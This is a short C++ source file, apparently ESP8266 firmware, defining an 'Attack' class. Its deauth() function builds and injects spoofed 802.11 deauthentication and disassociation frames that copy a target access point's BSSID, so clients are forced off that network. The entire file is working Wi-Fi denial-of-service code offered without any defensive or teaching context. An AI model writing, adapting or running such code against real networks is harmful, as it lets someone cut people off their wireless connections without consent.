#include "Attack.h"

Attack::Attack() {}

bool Attack::deauth(int apNum) {
  // build deauth packet
  int packetSize = sizeof(baseDeauthPacket);
  uint8_t deauthpkt[packetSize];
  memcpy(deauthpkt, baseDeauthPacket, packetSize);
  memcpy(&deauthpkt[10], WiFi.BSSID(apNum), 6);
  memcpy(&deauthpkt[16], WiFi.BSSID(apNum), 6);
  deauthpkt[24] = 1;

  // send deauth packet
  deauthpkt[0] = 0xC0;
  setWifiChannel(WiFi.channel(apNum));
  bool deauthSuccess = wifi_send_pkt_freedom(deauthpkt, packetSize, 0) == 0;

  // build disassociate packet
  uint8_t disassocpkt[packetSize];
  memcpy(disassocpkt, deauthpkt, packetSize);
  disassocpkt[0] = 0xA0;

  // send disassociation packet
  setWifiChannel(WiFi.channel(apNum));
  bool disassocSuccess = wifi_send_pkt_freedom(disassocpkt, packetSize, 0) == 0;

  return deauthSuccess && disassocSuccess;
}

void Attack::setWifiChannel(uint8_t channel) {
  if ((channel != currentChannel) && (channel < 15)) {
    wifi_set_channel(channel);
    currentChannel = channel;
  }
}
